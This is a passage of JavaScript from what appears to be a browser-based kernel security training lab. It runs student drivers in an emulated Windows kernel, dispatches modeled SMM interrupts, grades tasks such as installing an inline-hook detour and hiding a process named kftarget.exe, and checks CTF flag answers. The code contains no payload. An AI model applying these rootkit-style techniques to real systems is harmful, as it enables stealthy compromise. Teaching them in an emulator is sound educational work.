        const regPathBuf = currentKernel.allocPool(0x100);
        currentKernel.mem.writeUtf16(regPathBuf,
          "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + loaded.name);
        const result = currentKernel.callFunctionSeh(loaded.entry, [loaded.drvRec.va, regPathBuf],
          loaded.image);

        // A breakpoint hit pauses the burst (both engines); a unicorn int3
        // surfaces as a fault — notifyBreak adopts it only when it is ours.
        if ((result.status === "breakpoint" || result.status === "fault") &&
            currentDebugger?.notifyBreak?.(result)) {
          status("warn", "Execution paused on a breakpoint — continue in the debugger console (t/p/g/gu).");
          return;
        }
        if (result.status !== "ok") {
          status("err", `✗ Driver faulted: ${result.error?.message ?? result.status}`);
          for (const ex of currentKernel.exceptionTrace.splice(0)) {
            status("warn", `${ex.handled ? "SEH handled" : "UNHANDLED"} @ ${ex.faultRip}: ${ex.detail}`);
          }
          return;
        }

        // SMM labs: a driver can latch an SMI (port 0xB2). Dispatch the
        // modeled interrupt now and surface the handler's effects.
        if (currentKernel.smm?.smiPending) {
          const smm = currentKernel.smm;
          let guard = 0;
          while (smm.smiPending && guard++ < 2) {
            const r2 = smm.smiDispatch();
            compileStatus.append(h("div", { class: r2.status === "ok" ? "good" : "err" },
              `SMI #${guard}: handler ${r2.status}${r2.retval !== undefined ? ` retval=0x${r2.retval.toString(16)}` : ""}`));
            for (const line of smm.trace.slice(-4)) {
              compileStatus.append(h("div", { class: "mono dim" }, line));
            }
          }
          for (const landingVa of [currentKernel.smmLanding, currentKernel.smmLanding2]) {
            if (!landingVa) continue;
            const bytes = currentKernel.mem.read(landingVa, 16);
            const hex = [...bytes].map((b2) => b2.toString(16).padStart(2, "0")).join(" ");
            const ascii = [...bytes].map((b2) => (b2 >= 0x20 && b2 < 0x7f ? String.fromCharCode(b2) : ".")).join("");
            compileStatus.append(h("div", { class: "mono" },
              `landing @ 0x${landingVa.toString(16)}: ${hex}  |${ascii}|`));
          }
          currentDebugger.write("SMI dispatched — run !smram / !smmc to inspect SMRAM state.");
        }
        currentDebugger.write(`${loaded.name}: DriverEntry executed on ${backendSel.value} backend.`);

        // Task-specific verification against live kernel state.
        const ok = task.verify(currentKernel, loaded, status);
        if (lab.compileTask === "inline-hook") {
          currentDebugger.write(ok
            ? `Detour is live — inspect it with !hookscan / !hooktest.`
            : `No detour landed — check g_TargetFn and recompile.`);
        } else {
          currentDebugger.write(`Run !process 0 0 to verify kftarget.exe is hidden; lm shows your driver.`);
        }
      });
      card.append(editorHost, h("div", { class: "controls" }, compileBtn), compileStatus);
    }

    const controls = [backendSel, bootBtn];
    if (pane.targetUpload) {
      // Target binary for the sogen WASM core (uploaded, in-memory only).
      // With a target attached, the debugger shell controls the REAL
      // emulated process; without one it uses the JS reference backend.
      const targetInput = h("input", {
        type: "file",
        class: "target-upload",
        title: "Upload a Windows PE binary to debug in the sogen emulator (enables stepping/execution)",
      });
      targetInput.addEventListener("change", async () => {
        const f = targetInput.files?.[0];
        if (!f) return;
        const bytes = new Uint8Array(await f.arrayBuffer());
        const { addSogenTarget } = await import("./sogen-targets.js");
        addSogenTarget(f.name, bytes);
        currentDebugger?.write(
          `target "${f.name}" staged — Boot / Reset attaches the wasm core.`, "dim");
        targetInput.value = "";
      });
      controls.push(targetInput);
    }
    card.append(h("div", { class: "controls" }, ...controls));
    card.append(consoleHost);

    // ---- flag submission
    renderFlagInputs(card, lab, lesson);

    main.append(card);
  }
}

/** Flag prompt+input rows shared by every lab kind. */
function renderFlagInputs(card, lab, lesson) {
  for (const f of lab.flags) {
    const solved = !!progress.solvedFlags[f.id];
    const inp = h("input", { placeholder: solved ? "solved ✔" : "your answer…", disabled: solved ? "" : undefined });
    const btn = h("button", {
      disabled: solved ? "" : undefined,
      onclick: async () => {
        const ok = await checkFlag(inp.value, f);
        const ev = submitFlagForProgress(progress, lesson, f.id, ok);
        if (ok) {
          progress = ev.progress;
          await persist();
          btn.textContent = "✔";
          btn.classList.add("good");
          inp.placeholder = "solved ✔";
          inp.disabled = true;
          btn.disabled = true;
          refreshHeader();
          renderSidebar(); // surface newly unlocked lessons immediately
        } else {
          inp.classList.add("bad");
          setTimeout(() => inp.classList.remove("bad"), 600);
        }
      },
    }, solved ? "✔" : "submit");
    card.append(h("div", { class: "flag" },
      h("span", { class: "prompt" }, f.prompt),
      h("span", { class: "pts" }, `${f.points} pts`),
      h("div", { class: "row" }, inp, btn),
    ));
  }
}

// --------------------------------------------------------------------- init

(async function init() {
  try { progress = (await loadProgress()) ?? emptyProgress(); } catch { progress = emptyProgress(); }
  renderShell();
})();
